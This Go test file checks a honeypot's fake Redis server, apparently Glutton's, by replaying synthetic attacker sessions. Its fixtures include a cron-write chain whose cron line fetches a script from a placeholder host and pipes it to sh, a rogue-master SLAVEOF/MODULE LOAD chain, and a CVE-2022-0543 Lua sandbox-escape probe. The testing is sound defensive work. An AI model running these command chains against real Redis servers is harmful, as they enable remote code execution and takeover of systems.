package tcp

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/mushorg/glutton/connection"
	"github.com/mushorg/glutton/protocols/tcp/redis"
	"github.com/stretchr/testify/require"
)

// The fixtures are synthetic: nmap's redis-server probe, redis-cli framing,
// and the cron-write and rogue-master chains as published for Redis worms.
// No captured event was available.

// resp frames args as a redis-cli multibulk request.
func resp(args ...string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "*%d\r\n", len(args))
	for _, a := range args {
		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(a), a)
	}
	return b.String()
}

var redisTestStart = time.Date(2026, 9, 1, 8, 0, 0, 0, time.UTC)

func startRedis(t *testing.T) (net.Conn, *bufio.Reader, *fakeHoneypot, chan error) {
	t.Helper()
	prevInstance, prevNow, prevID := redisInstance, redisNow, redisClientID.Load()
	redisInstance = redisPersona{
		RunID:   "f2b3ac5d1e9c0a7b4d6e8f0a1b2c3d4e5f607182",
		ReplID:  "0a1b2c3d4e5f60718293a4b5c6d7e8f901234567",
		PID:     1123,
		Started: redisTestStart,
	}
	redisNow = func() time.Time { return redisTestStart.Add(36 * time.Hour) }
	redisClientID.Store(41)
	t.Cleanup(func() {
		redisInstance, redisNow = prevInstance, prevNow
		redisClientID.Store(prevID)
	})

	client, serverConn := net.Pipe()
	t.Cleanup(func() { client.Close() })
	serverConn = connWithRemote{Conn: serverConn, remote: staticAddr{addr: "192.0.2.1:54321"}}
	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleRedis(context.Background(), serverConn, connection.Metadata{TargetPort: 6379}, &recordingLogger{}, hp)
	}()
	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
	return client, bufio.NewReader(client), hp, done
}

// sendRedis writes in the background so pipelined requests cannot deadlock
// the unbuffered pipe while the handler writes replies.
func sendRedis(t *testing.T, conn net.Conn, data string) {
	t.Helper()
	errc := make(chan error, 1)
	go func() {
		_, err := conn.Write([]byte(data))
		errc <- err
	}()
	t.Cleanup(func() { <-errc })
}

// readRedisReply reads one complete RESP reply and returns its raw bytes.
func readRedisReply(t *testing.T, r *bufio.Reader) string {
	t.Helper()
	line, err := r.ReadString('\n')
	require.NoError(t, err)
	out := line
	switch line[0] {
	case '$':
		var n int
		_, err := fmt.Sscanf(line, "$%d\r\n", &n)
		require.NoError(t, err)
		if n >= 0 {
			body := make([]byte, n+2)
			_, err := io.ReadFull(r, body)
			require.NoError(t, err)
			out += string(body)
		}
	case '*':
		var n int
		_, err := fmt.Sscanf(line, "*%d\r\n", &n)
		require.NoError(t, err)
		for range n {
			out += readRedisReply(t, r)
		}
	}
	return out
}

func finishRedis(t *testing.T, client net.Conn, hp *fakeHoneypot, done chan error) (producedTCP, []parsedRedis) {
	t.Helper()
	require.NoError(t, client.Close())
	waitHandlerDone(t, done)
	produced := waitProduced(t, hp)
	require.Equal(t, "redis", produced.protocol)
	require.Empty(t, hp.produced, "exactly one event per session")
	events, ok := produced.decoded.([]parsedRedis)
	require.True(t, ok)
	return produced, events
}

func rRead(payload, command string, args ...string) parsedRedis {
	f := parsedRedis{Direction: "read", Command: command, Payload: []byte(payload)}
	if len(args) > 0 {
		f.Args = args
	}
	return f
}

func rWrite(r redis.Reply) parsedRedis {
	return parsedRedis{Direction: "write", Status: r.Status, Payload: r.Data}
}

func TestHandleRedisNmapInfo(t *testing.T) {
	client, r, hp, done := startRedis(t)

	probe := resp("info")
	sendRedis(t, client, probe)
	reply := readRedisReply(t, r)
	require.True(t, strings.HasPrefix(reply, "$"))
	for _, want := range []string{
		"# Server\r\nredis_version:5.0.7\r\n",
		"process_id:1123\r\nrun_id:f2b3ac5d1e9c0a7b4d6e8f0a1b2c3d4e5f607182\r\ntcp_port:6379\r\nuptime_in_seconds:129600\r\nuptime_in_days:1\r\n",
		"\r\n\r\n# Replication\r\nrole:master\r\n",
		"rdb_last_save_time:1788249600\r\n",
		"total_connections_received:42\r\n",
	} {
		require.Contains(t, reply, want)
	}
	require.NotContains(t, reply, "# Keyspace\r\ndb0", "an empty keyspace lists no db")

	produced, events := finishRedis(t, client, hp, done)
	require.Equal(t, []byte(probe), produced.payload)
	require.Equal(t, connection.EndClientClose, produced.endReason)
	require.Equal(t, []parsedRedis{
		rRead(probe, "info"),
		{Direction: "write", Status: "bulk", Payload: []byte(reply)},
	}, events)
}

func TestHandleRedisCronWriteChain(t *testing.T) {
	client, r, hp, done := startRedis(t)

	cron := "\n\n*/2 * * * * root curl -fsSL http://payload.example.invalid/x.sh | sh\n\n"
	reqs := []string{
		resp("flushall"),
		resp("set", "backup1", cron),
		resp("config", "set", "dir", "/var/spool/cron/"),
		resp("config", "set", "dbfilename", "root"),
		resp("save"),
		resp("config", "get", "dir"),
		resp("info", "keyspace"),
	}
	// worms pipeline the whole chain in one segment
	sendRedis(t, client, strings.Join(reqs, ""))
	var replies []string
	for range reqs {
		replies = append(replies, readRedisReply(t, r))
	}
	require.Equal(t, []string{
		"+OK\r\n", "+OK\r\n", "+OK\r\n", "+OK\r\n", "+OK\r\n",
		"*2\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/\r\n",
		"$44\r\n# Keyspace\r\ndb0:keys=1,expires=0,avg_ttl=0\r\n\r\n",
	}, replies)

	_, events := finishRedis(t, client, hp, done)
	cfgDir := rRead(reqs[2], "config set", "dir", "/var/spool/cron/")
	cfgDir.Path = "/var/spool/cron/"
	cfgFile := rRead(reqs[3], "config set", "dbfilename", "root")
	cfgFile.Path = "root"
	ok := rWrite(redis.Simple("OK"))
	require.Equal(t, []parsedRedis{
		rRead(reqs[0], "flushall"), ok,
		rRead(reqs[1], "set", "backup1", cron), ok,
		cfgDir, ok,
		cfgFile, ok,
		rRead(reqs[4], "save"), ok,
		rRead(reqs[5], "config get", "dir"), rWrite(redis.Array("dir", "/var/spool/cron/")),
		rRead(reqs[6], "info", "keyspace"), {Direction: "write", Status: "bulk", Payload: []byte(replies[6])},
	}, events)
}

func TestHandleRedisRogueMaster(t *testing.T) {
	client, r, hp, done := startRedis(t)

	reqs := []string{
		resp("SLAVEOF", "203.0.113.5", "21000"),
		resp("info", "replication"),
		resp("MODULE", "LOAD", "/tmp/exp.so"),
		resp("system.exec", "id"),
		resp("SLAVEOF", "NO", "ONE"),
	}
	var replies []string
	for _, req := range reqs {
		sendRedis(t, client, req)
		replies = append(replies, readRedisReply(t, r))
	}
	require.Equal(t, "+OK\r\n", replies[0])
	require.Contains(t, replies[1], "role:slave\r\nmaster_host:203.0.113.5\r\nmaster_port:21000\r\nmaster_link_status:down\r\n")
	require.Equal(t, "-ERR Error loading the extension. Please check the server logs.\r\n", replies[2])
	require.Equal(t, "-ERR unknown command `system.exec`, with args beginning with: `id`, \r\n", replies[3])
	require.Equal(t, "+OK\r\n", replies[4])

	_, events := finishRedis(t, client, hp, done)
	slaveof := rRead(reqs[0], "slaveof", "203.0.113.5", "21000")
	slaveof.Master = "203.0.113.5:21000"
	module := rRead(reqs[2], "module load", "/tmp/exp.so")
	module.Path = "/tmp/exp.so"
	require.Equal(t, []parsedRedis{
		slaveof, rWrite(redis.Simple("OK")),
		rRead(reqs[1], "info", "replication"), {Direction: "write", Status: "bulk", Payload: []byte(replies[1])},
		module, {Direction: "write", Status: "ERR", Payload: []byte(replies[2])},
		rRead(reqs[3], "system.exec", "id"), {Direction: "write", Status: "ERR", Payload: []byte(replies[3])},
		rRead(reqs[4], "slaveof", "NO", "ONE"), rWrite(redis.Simple("OK")),
	}, events)
}

func TestHandleRedisAuthRecordsCredentials(t *testing.T) {
	client, r, hp, done := startRedis(t)

	reqs := []string{
		resp("AUTH", "foobared"),
		resp("AUTH", "default", "redis123"),
		resp("HELLO", "3", "AUTH", "admin", "admin"),
		resp("config", "set", "requirepass", "s3cret"),
		resp("AUTH", "wrong"),
		resp("AUTH", "s3cret"),
	}
	var replies []string
	for _, req := range reqs {
		sendRedis(t, client, req)
		replies = append(replies, readRedisReply(t, r))
	}
	require.Equal(t, []string{
		"-ERR Client sent AUTH, but no password is set\r\n",
		"-ERR wrong number of arguments for 'auth' command\r\n",
		"-ERR unknown command `HELLO`, with args beginning with: `3`, `AUTH`, `admin`, `admin`, \r\n",
		"+OK\r\n",
		"-ERR invalid password\r\n",
		"+OK\r\n",
	}, replies)

	_, events := finishRedis(t, client, hp, done)
	reads := []parsedRedis{}
	for _, e := range events {
		if e.Direction == "read" {
			reads = append(reads, e)
		}
	}
	type cred struct{ user, pass string }
	got := []cred{}
	for _, e := range reads {
		got = append(got, cred{e.Username, e.Password})
	}
	require.Equal(t, []cred{
		{"", "foobared"}, {"default", "redis123"}, {"admin", "admin"}, {"", "s3cret"}, {"", "wrong"}, {"", "s3cret"},
	}, got)
	require.Equal(t, []string{"requirepass", "s3cret"}, reads[3].Args)
}

func TestHandleRedisInline(t *testing.T) {
	client, r, hp, done := startRedis(t)

	// netcat users type inline commands; a blank line gets no reply
	sendRedis(t, client, "\r\nPING\r\nkeys *\r\n")
	require.Equal(t, "+PONG\r\n", readRedisReply(t, r))
	require.Equal(t, "*0\r\n", readRedisReply(t, r))

	_, events := finishRedis(t, client, hp, done)
	require.Equal(t, []parsedRedis{
		{Direction: "read", Payload: []byte("\r\n"), Inline: true},
		{Direction: "read", Command: "ping", Payload: []byte("PING\r\n"), Inline: true},
		rWrite(redis.Simple("PONG")),
		{Direction: "read", Command: "keys", Args: []string{"*"}, Payload: []byte("keys *\r\n"), Inline: true},
		rWrite(redis.Array()),
	}, events)
}

func TestHandleRedisEvalSandboxEscape(t *testing.T) {
	client, r, hp, done := startRedis(t)

	// CVE-2022-0543 probe
	script := `local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res`
	sendRedis(t, client, resp("eval", script, "0"))
	reply := readRedisReply(t, r)
	require.True(t, strings.HasPrefix(reply, "-ERR Error running script (call to f_"))
	require.True(t, strings.HasSuffix(reply, "Script attempted to access nonexistent global variable 'package' \r\n"))

	sendRedis(t, client, resp("eval", "return 1", "0"))
	require.Equal(t, "$-1\r\n", readRedisReply(t, r))

	_, events := finishRedis(t, client, hp, done)
	require.Len(t, events, 4)
	require.Equal(t, "eval", events[0].Command)
	require.Equal(t, []string{script, "0"}, events[0].Args)
	require.Equal(t, "ERR", events[1].Status)
}

func TestHandleRedisEarlyDisconnect(t *testing.T) {
	client, _, hp, done := startRedis(t)

	produced, events := finishRedis(t, client, hp, done)
	require.Empty(t, produced.payload)
	require.Empty(t, events)
	require.Equal(t, connection.EndClientClose, produced.endReason)
}

func TestHandleRedisCutOffRequest(t *testing.T) {
	client, _, hp, done := startRedis(t)

	partial := "*2\r\n$4\r\necho\r\n$10\r\nhel"
	sendRedis(t, client, partial)
	time.Sleep(20 * time.Millisecond)

	_, events := finishRedis(t, client, hp, done)
	require.Equal(t, []parsedRedis{
		{Direction: "read", Command: "echo", Payload: []byte(partial), Truncated: true},
	}, events)
}

func TestHandleRedisProtocolError(t *testing.T) {
	client, r, hp, done := startRedis(t)

	bad := "*1\r\n+info\r\n"
	sendRedis(t, client, bad)
	require.Equal(t, "-ERR Protocol error: expected '$', got '+'\r\n", readRedisReply(t, r))
	waitHandlerDone(t, done)

	produced := waitProduced(t, hp)
	require.Equal(t, connection.EndReadError, produced.endReason)
	require.Equal(t, []parsedRedis{
		{Direction: "read", Payload: []byte(bad), Truncated: true},
		{Direction: "write", Status: "ERR", Payload: []byte("-ERR Protocol error: expected '$', got '+'\r\n")},
	}, produced.decoded)
}

func TestHandleRedisOversizeRequest(t *testing.T) {
	client, r, hp, done := startRedis(t)

	big := resp("set", "k", strings.Repeat("A", redis.MaxRequestLen))
	sendRedis(t, client, big)
	require.Equal(t, "-ERR Protocol error: invalid bulk length\r\n", readRedisReply(t, r))
	waitHandlerDone(t, done)

	produced := waitProduced(t, hp)
	events := produced.decoded.([]parsedRedis)
	require.Len(t, events, 2)
	require.True(t, events[0].Truncated)
	require.Len(t, events[0].Payload, redis.MaxRequestLen)
	require.Equal(t, []byte(big[:redis.MaxRequestLen]), events[0].Payload)
	require.Equal(t, connection.EndReadError, produced.endReason)
}

func TestHandleRedisCommandCap(t *testing.T) {
	client, r, hp, done := startRedis(t)

	sendRedis(t, client, strings.Repeat("PING\r\n", maxRedisCommands+5))
	for range maxRedisCommands {
		require.Equal(t, "+PONG\r\n", readRedisReply(t, r))
	}
	waitHandlerDone(t, done)
	produced := waitProduced(t, hp)
	require.Equal(t, connection.EndMaxFrames, produced.endReason)
	require.Len(t, produced.decoded.([]parsedRedis), 2*maxRedisCommands)
	_, _ = io.Copy(io.Discard, client)
}

func TestHandleRedisQuitAndCrossProtocol(t *testing.T) {
	for _, tc := range []struct {
		req, reply string
	}{
		{resp("quit"), "+OK\r\n"},
		// an HTTP POST relayed by a browser (SSRF) is dropped without a reply
		{"POST / HTTP/1.1\r\nHost: 127.0.0.1:6379\r\n\r\n", ""},
	} {
		client, r, hp, done := startRedis(t)
		sendRedis(t, client, tc.req)
		if tc.reply != "" {
			require.Equal(t, tc.reply, readRedisReply(t, r))
		}
		waitHandlerDone(t, done)
		produced := waitProduced(t, hp)
		require.Equal(t, connection.EndHandlerClose, produced.endReason)
		_, _ = io.Copy(io.Discard, client)
	}
}

func TestHandleRedisKeyspace(t *testing.T) {
	client, r, hp, done := startRedis(t)

	for _, tc := range []struct{ req, reply string }{
		{resp("get", "x"), "$-1\r\n"},
		{resp("set", "x", "1", "NX"), "+OK\r\n"},
		{resp("set", "x", "2", "NX"), "$-1\r\n"},
		{resp("get", "x"), "$1\r\n1\r\n"},
		{resp("exists", "x", "y"), ":1\r\n"},
		{resp("type", "x"), "+string\r\n"},
		{resp("ttl", "y"), ":-2\r\n"},
		{resp("scan", "0", "MATCH", "x*"), "*2\r\n$1\r\n0\r\n*1\r\n$1\r\nx\r\n"},
		{resp("dbsize"), ":1\r\n"},
		{resp("del", "x", "y"), ":1\r\n"},
		{resp("select", "16"), "-ERR DB index is out of range\r\n"},
		{resp("get"), "-ERR wrong number of arguments for 'get' command\r\n"},
		{resp("config", "get", "bogus*"), "*0\r\n"},
		{resp("config", "set", "bogus", "1"), "-ERR Unsupported CONFIG parameter: bogus\r\n"},
		{resp("command", "docs"), "-ERR Unknown subcommand or wrong number of arguments for 'docs'. Try COMMAND HELP.\r\n"},
		{resp("client", "list"), "$149\r\nid=42 addr=192.0.2.1:54321 fd=8 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=26 qbuf-free=32742 obl=0 oll=0 omem=0 events=r cmd=client\n\r\n"},
		{resp("lastsave"), ":1788249600\r\n"},
	} {
		sendRedis(t, client, tc.req)
		require.Equal(t, tc.reply, readRedisReply(t, r), tc.req)
	}
	finishRedis(t, client, hp, done)
}
